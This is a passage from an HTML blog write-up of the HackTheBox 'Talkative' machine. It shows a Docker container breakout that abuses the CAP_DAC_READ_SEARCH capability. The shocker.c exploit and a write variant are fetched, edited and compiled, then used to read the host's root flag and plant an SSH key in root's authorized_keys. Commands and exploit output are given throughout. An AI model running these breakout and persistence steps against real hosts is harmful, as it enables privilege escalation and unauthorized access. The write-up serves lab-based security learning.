class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> sensitive env found:</span><br><span class="line">	DEPLOY_METHOD=docker-official</span><br><span class="line"></span><br><span class="line">[Information Gathering - Commands <span class="keyword">and</span> Capabilities]</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> available commands:</span><br><span class="line">	find,node,npm,apt,dpkg,mount,fdisk,base64,perl</span><br><span class="line"><span class="number">2022</span>/04/<span class="number">25</span> <span class="number">14</span>:<span class="number">34</span>:<span class="number">40</span> Capabilities <span class="built_in">hex</span> of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):</span><br><span class="line">	CapInh:	<span class="number">0000000000000000</span></span><br><span class="line">	CapPrm:	00000000a80425fd</span><br><span class="line">	CapEff:	00000000a80425fd</span><br><span class="line">	CapBnd:	00000000a80425fd</span><br><span class="line">	CapAmb:	<span class="number">0000000000000000</span></span><br><span class="line">	Cap decode: <span class="number">0x00000000a80425fd</span> = CAP_CHOWN,CAP_DAC_READ_SEARCH,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP</span><br><span class="line">	Add capability <span class="built_in">list</span>: CAP_DAC_READ_SEARCH</span><br><span class="line">[*] Maybe you can exploit the Capabilities below:</span><br><span class="line">[!] CAP_DAC_READ_SEARCH enabled. You can read files <span class="keyword">from</span> host. Use <span class="string">&#x27;cdk run cap-dac-read-search&#x27;</span> ... <span class="keyword">for</span> exploitation.</span><br></pre></td></tr></table></figure>

<p>According the manual, the <code>CAP_DAC_READ_SEARCH</code> capability allows to bypass file read permission checks:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man capabilities</span><br><span class="line">[...]</span><br><span class="line">CAP_DAC_READ_SEARCH</span><br><span class="line">    * Bypass file read permission checks and directory read</span><br><span class="line">      and execute permission checks;</span><br><span class="line">    * invoke open_by_handle_at(<span class="number">2</span>);</span><br><span class="line">    * use the linkat(<span class="number">2</span>) AT_EMPTY_PATH flag to create a link to</span><br><span class="line">      a file referred to by a file descriptor.</span><br></pre></td></tr></table></figure>

<p>Let‚Äôs see if we can exploit this capability to read the <code>/root/root.txt</code> flag from the host:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@c150397ccd63:<span class="regexp">/root# ./</span>cdk run cap-dac-read-search /etc/hosts /root/root.txt</span><br><span class="line">Running <span class="keyword">with</span> target: <span class="regexp">/root/</span>root.txt, <span class="attr">ref</span>: <span class="regexp">/etc/</span>hosts</span><br><span class="line">08a6xxxxxxxxxxd971</span><br></pre></td></tr></table></figure>

<p>To see what happened behind the hood of <code>cdk</code> we can take a retrieve the original exploit used, named <code>[shocker.c](http://stealth.openwall.net/xSports/shocker.c)</code> . Reading through the source code to understand how it works.</p>
<p>By editing the exploit to our current situation we can also retrieve the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sed -i <span class="string">&#x27;s/\/.dockerinit/\/etc\/hostname/g&#x27;</span> shocker.c</span><br><span class="line">[hg8@archbook ~]$ sed -i <span class="string">&#x27;s/\/etc\/shadow/\/root\/root.txt/g&#x27;</span> shocker.c</span><br><span class="line">[hg8@archbook ~]$ cc -Wall -std=c99 -O2 shocker.c -static -o shocker</span><br></pre></td></tr></table></figure>

<p>Then whiting the container:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@c150397ccd63:/root<span class="comment"># chmod +x shocker &amp;&amp; ./shocker</span></span><br><span class="line">[***] docker VMM-container breakout Po(C) <span class="number">2014</span>             [***]</span><br><span class="line">[*] Resolving <span class="string">&#x27;root/root.txt&#x27;</span></span><br><span class="line">[*] Found lib32</span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found lost+found</span><br><span class="line">[*] Found sbin</span><br><span class="line">[*] Found <span class="built_in">bin</span></span><br><span class="line">[*] Found boot</span><br><span class="line">[*] Found dev</span><br><span class="line">[*] Found run</span><br><span class="line">[*] Found lib64</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found var</span><br><span class="line">[*] Found home</span><br><span class="line">[*] Found media</span><br><span class="line">[*] Found proc</span><br><span class="line">[*] Found etc</span><br><span class="line">[*] Found lib</span><br><span class="line">[*] Found libx32</span><br><span class="line">[*] Found cdrom</span><br><span class="line">[*] Found root</span><br><span class="line">[+] Match: root ino=<span class="number">18</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (root) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[*] Resolving <span class="string">&#x27;root.txt&#x27;</span></span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found .backup</span><br><span class="line">[*] Found .config</span><br><span class="line">[*] Found .cache</span><br><span class="line">[*] Found .local</span><br><span class="line">[*] Found .ssh</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found .profile</span><br><span class="line">[*] Found .bashrc</span><br><span class="line">[*] Found root.txt</span><br><span class="line">[+] Match: root.txt ino=<span class="number">110097</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (root.txt) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[!] Got a final handle!</span><br><span class="line">[*] <span class="comment">#=8, 1, char nh[] = &#123;0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;</span></span><br><span class="line">[!] Win! /root/root.txt output follows:</span><br><span class="line">08a6xxxxxxxxxxd971</span><br></pre></td></tr></table></figure>

<h3 id="Arbitrary-file-read-‚Üí-Root-Shell"><a href="#Arbitrary-file-read-‚Üí-Root-Shell" class="headerlink" title="Arbitrary file read ‚Üí Root Shell"></a>Arbitrary file read ‚Üí Root Shell</h3><p>Well arbitrary file read are cool but can we say we finished the box without a proper shell ?<br>While researching a bit more on the <code>shocker.c</code> exploit I stumble upon a variant exploit <code>[exploit_dac-read-search_dac-override.c](https://github.com/akusec/Docker_Exploits/blob/main/Capabilities/DAC_READ_SEARCH/exploit_dac-read-search_dac-override.c)</code> using <code>CAP_DAC_OVERRIDE</code> capability to write arbitrary file.</p>
<p><em>Note: <code>DAC_OVERRIDE</code> is activated by default on containers but alone it‚Äôs not a risk for container breakout.</em></p>
<p>Let‚Äôs build the exploit to add our SSH key to the <code>root</code> account <code>authorized_keys</code> file.</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https:<span class="comment">//raw.githubusercontent.com/akusec/Docker_Exploits/main/Capabilities/DAC_READ_SEARCH/exploit_dac-read-search_dac-override.c</span></span><br><span class="line">[hg8@archbook ~]$ cc -Wall -std=c99 -O2 exploit_dac-read-search_dac-override.c -<span class="keyword">static</span> -o shocker_write</span><br></pre></td></tr></table></figure>

<p> Then in our container:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">(remote) root@c150397ccd63:/tmp# cat authorized_keys</span><br><span class="line">ssh-ed25519 AAAAC3NzxxxxxxiC hg8@talkative.htb</span><br><span class="line">(remote) root@c150397ccd63:<span class="regexp">/tmp# ./</span>shocker_write /root/.ssh/authorized_keys authorized_keys</span><br><span class="line">[*] Resolving <span class="string">&#x27;root/.ssh/authorized_keys&#x27;</span></span><br><span class="line">[*] Found lib32</span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found lost+found</span><br><span class="line">[*] Found sbin</span><br><span class="line">[*] Found bin</span><br><span class="line">[*] Found boot</span><br><span class="line">[*] Found dev</span><br><span class="line">[*] Found run</span><br><span class="line">[*] Found lib64</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found <span class="keyword">var</span></span><br><span class="line">[*] Found home</span><br><span class="line">[*] Found media</span><br><span class="line">[*] Found proc</span><br><span class="line">[*] Found etc</span><br><span class="line">[*] Found lib</span><br><span class="line">[*] Found libx32</span><br><span class="line">[*] Found cdrom</span><br><span class="line">[*] Found root</span><br><span class="line">[+] Match: root ino=<span class="number">18</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (root) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] #=<span class="number">8</span>, <span class="number">1</span>, char nh[] = &#123;<span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">[*] Resolving <span class="string">&#x27;.ssh/authorized_keys&#x27;</span></span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found .backup</span><br><span class="line">[*] Found .config</span><br><span class="line">[*] Found .cache</span><br><span class="line">[*] Found .local</span><br><span class="line">[*] Found .ssh</span><br><span class="line">[+] Match: .ssh ino=<span class="number">9718</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (.ssh) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] #=<span class="number">8</span>, <span class="number">1</span>, char nh[] = &#123;<span class="number">0xf6</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">[*] Resolving <span class="string">&#x27;authorized_keys&#x27;</span></span><br><span class="line">[*] Found ..</span><br><span class="line">[*] Found id_rsa.pub</span><br><span class="line">[*] Found .</span><br><span class="line">[*] Found known_hosts</span><br><span class="line">[*] Found authorized_keys</span><br><span class="line">[+] Match: authorized_keys ino=<span class="number">9720</span></span><br><span class="line">[*] Brute forcing remaining 32bit. This can take a <span class="keyword">while</span>...</span><br><span class="line">[*] (authorized_keys) Trying: <span class="number">0x00000000</span></span><br><span class="line">[*] #=<span class="number">8</span>, <span class="number">1</span>, char nh[] = &#123;<span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">[!] Got a final handle!</span><br><span class="line">[*] #=<span class="number">8</span>, <span class="number">1</span>, char nh[] = &#123;<span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">Success!!</span><br></pre></td></tr></table></figure>

<p>The file successfully got written. Let‚Äôs now go back to the Bolt CMS container shell (only container to have SSH access to the main server) and connect using our newly added SSH key:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(remote) www-data@8ad3cb438f7e:/tmp$ chmod <span class="number">600</span> id_ed25519_hg8</span><br><span class="line">(remote) www-data@8ad3cb438f7e:/tmp$ ssh root@<span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span> -i id_ed25519_hg8</span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="string">&#x27;172.18.0.1 (172.18.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Apr 29 18:57:57 2022 from 10.129.111.185</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@talkative:~# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@talkative:~# cat root.txt</span></span><br><span class="line"><span class="string">adbxxxxxxxxxxxxxxx14a</span></span><br></pre></td></tr></table></figure>

<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/CsEnox/CVE-2021-22911">CVE-2021-22911: Pre-Auth Blind NoSQL Injection leading to Remote Code Execution in Rocket Chat 3.12.1</a></li>
<li><a target="_blank" rel="noopener" href="http://stealth.openwall.net/xSports/shocker.c">shocker.c: docker PoC VMM-container breakout</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/akusec/Docker_Exploits/blob/main/Capabilities/DAC_READ_SEARCH/exploit_dac-read-search_dac-override.c">exploit_dac-read-search_dac-override.c: Shocker exploit + overwrite</a></li>
<li><a target="_blank" rel="noopener" href="https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3">Docker breakout exploit analysis</a>.</li>
</ul>
<hr>
<p>That‚Äôs it folks! As always do not hesitate to contact me for any questions or feedback!</p>
<p>See you next time ;)</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> ‚Ä∫ <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> ‚Ä∫ <a class="category-link" href="/categories/CTF/HackTheBox/Hard-Box/">Hard Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CVE/" rel="tag">CVE</a>, <a class="tag-link-link" href="/tags/Linux/" rel="tag">Linux</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/bolt/" rel="tag">bolt</a>, <a class="tag-link-link" href="/tags/cap-dac-read-search/" rel="tag">cap-dac-read-search</a>, <a class="tag-link-link" href="/tags/container/" rel="tag">container</a>, <a class="tag-link-link" href="/tags/docker/" rel="tag">docker</a>, <a class="tag-link-link" href="/tags/jamovi/" rel="tag">jamovi</a>, <a class="tag-link-link" href="/tags/mongodb/" rel="tag">mongodb</a>, <a class="tag-link-link" href="/tags/pwncat/" rel="tag">pwncat</a>, <a class="tag-link-link" href="/tags/r-lang/" rel="tag">r-lang</a>, <a class="tag-link-link" href="/tags/recon/" rel="tag">recon</a>, <a class="tag-link-link" href="/tags/rocket-chat/" rel="tag">rocket.chat</a>, <a class="tag-link-link" href="/tags/shocker/" rel="tag">shocker</a>, <a class="tag-link-link" href="/tags/ssti/" rel="tag">ssti</a>, <a class="tag-link-link" href="/tags/twig/" rel="tag">twig</a>, <a class="tag-link-link" href="/tags/webhook/" rel="tag">webhook</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-on-jamovi-Rj-Editor"><span class="toc-number">1.2.</span> <span class="toc-text">RCE on jamovi Rj Editor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-jamovi-%E2%86%92-Bolt"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot jamovi ‚Üí Bolt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-Bolt-%E2%86%92-Saul-user"><span class="toc-number">1.4.</span> <span class="toc-text">Pivot Bolt ‚Üí Saul user</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">2.</span> <span class="toc-text">Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-saul-%E2%86%92-Rocket-chat"><span class="toc-number">2.2.</span> <span class="toc-text">Pivot saul ‚Üí Rocket.chat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-file-read-%E2%86%92-Root-Shell"><span class="toc-number">2.3.</span> <span class="toc-text">Arbitrary file read ‚Üí Root Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
